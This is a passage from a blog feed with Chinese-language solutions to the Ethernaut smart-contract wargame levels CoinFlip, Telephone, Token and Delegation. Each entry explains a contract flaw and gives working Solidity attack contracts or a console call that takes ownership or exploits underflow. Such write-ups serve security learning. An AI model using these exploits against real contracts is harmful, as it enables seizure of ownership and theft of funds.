&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong><br>硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。</p><p>然而，最优解是通过在另外一份合约，执行预测逻辑，获得对应结果后再调用coinflip完成目标。</p><p>参考：<br>获取实例地址<br>在remix上部署一份攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Hack &#123;<br>  CoinFlip target;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor(address _target) &#123;<br>    target = CoinFlip(_target);<br>  &#125;<br><br>  function flip() public &#123;<br>    bool guess = _guess();<br>    target.flip(guess);<br>  &#125;<br><br>  function _guess() private view returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br>    return side;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后连续使用攻击合约的flip方法进行攻击10次就行</p><blockquote><p>Tips：<br>SafeMath库：防溢出的增强型运算方法<br>block.num：当前区块数（需要添加一个与web3的链接<br>block.blockhash：区块哈希值</p></blockquote><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：连续猜对硬币的正反面十次。&lt;del&gt;区区千分之一的运气我也不是没有&lt;/del&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="Ethernaut" scheme="https://mulladylex.github.io/project/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="https://mulladylex.github.io/project/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="https://mulladylex.github.io/project/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Telephone</title>
    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/telephone/"/>
    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/telephone/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:41:44.598Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs s">function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题涉及到tx.origin与msg.sender的区别：</p><blockquote><p>tx.origin是发起交易的账户<br>msg.sender是当前直接调用这个合约的即时账户</p></blockquote><p>例如：Alice通过调用合约A来调用合约B，合约A中与合约B中的tx.origin与msg.sender的情形如下：</p><table><thead><tr><th>Alice</th><th>-&gt;A</th><th>-&gt;B</th></tr></thead><tbody><tr><td>tx.origin</td><td>Alice</td><td>Alice</td></tr><tr><td>msg.sender</td><td>Alice</td><td>A</td></tr></tbody></table><p>如果情景是在一个合约下的调用，那么这两者是没有区别的；</p><p>参考：将合约复制到Remix中，再编写一个攻击合约，在Ethernaut上获取实例地址，在remix上连接MetaMask钱包部署攻击合约，通过攻击合约调用实例中的方法改变owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Hack &#123;<br>  constructor(address _addr) &#123;<br>    Telephone(_addr).changeOwner(msg.sender);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="Ethernaut" scheme="https://mulladylex.github.io/project/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="https://mulladylex.github.io/project/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="https://mulladylex.github.io/project/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Token</title>
    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/token/"/>
    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/token/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2024-04-09T14:28:39.082Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取更多的Token  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs s">function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里可以通过<em>下溢</em> 绕过require检测，因为<code>_value</code>和<code>balances[address]</code>都为无符号整数，所以结果会变为2^256-1</p><p>参考：略</p><blockquote><p>solidity的0.6版本还没内置溢出检测，而在0.8及以后版本中当发生溢出后会进行<code>revert()</code>。</p></blockquote><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取更多的Token  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="Ethernaut" scheme="https://mulladylex.github.io/project/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="https://mulladylex.github.io/project/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="https://mulladylex.github.io/project/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Delegation</title>
    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/delegation/"/>
    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/delegation/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:59:43.697Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：这题包含了两个合约<code>Delegation</code>和<code>Delegate</code>，<code>Delegation</code>合约实例化了<code>Delegate</code>合约，又在其<code>Fallback()</code>中使用了<code>delegatecall</code>来调用了delegate合约。</p><blockquote><p>call函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool）和返回的数据（ bytes memory）。而delegatecall（委托调用）又与call有所不同：通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。<br>这个函数主要是方便我们使用存在其他地方的函数——合约可以在运行时动态地从不同的地址加载代码。（用户必须确保两个合约中的存储结构都适合使用delegatecall。）</p></blockquote><p><strong>解题点：</strong><br><code>delegate.sol</code>合约中有一个公共的<code>pwn()</code>，可以将owner更改为调用者。</p><p>而在<code>Delegation.sol</code>中，而使用<code>detegatecall</code>执行的环境是被调用合约，因此上面通过<code>pwn()</code>修改的owner也即是<code>Delegation.owner</code>，同时也是我们本题的目标。</p><p>因此我们只需通过调用Fallback函数，进行委托调用，更新owner。</p><p>解题参考：在控制台上直接调用<code>contract.sendTransaction(&#123;data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)&#125;)</code>，这表示向合约直接发送一个消息，接着能够直接进入Fallback函数中去。</p><p>或者直接获取实例地址，复制合约到Remix中，在<code>Delegate</code>合约中<code>Ataddress &#39;你获得的实例地址&#39;</code>部署合约，通过调用<code>pwn()</code>也能够实现目标。</p><p>但可能因为gas原因无法正常交易，提高燃料限制再进行交易</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="Ethernaut" scheme="https://mulladylex.github.io/project/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="https://mulladylex.github.io/project/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="https://mulladylex.github.io/project/tags/Ethereum/"/>
    
  </entry>
  
</feed>
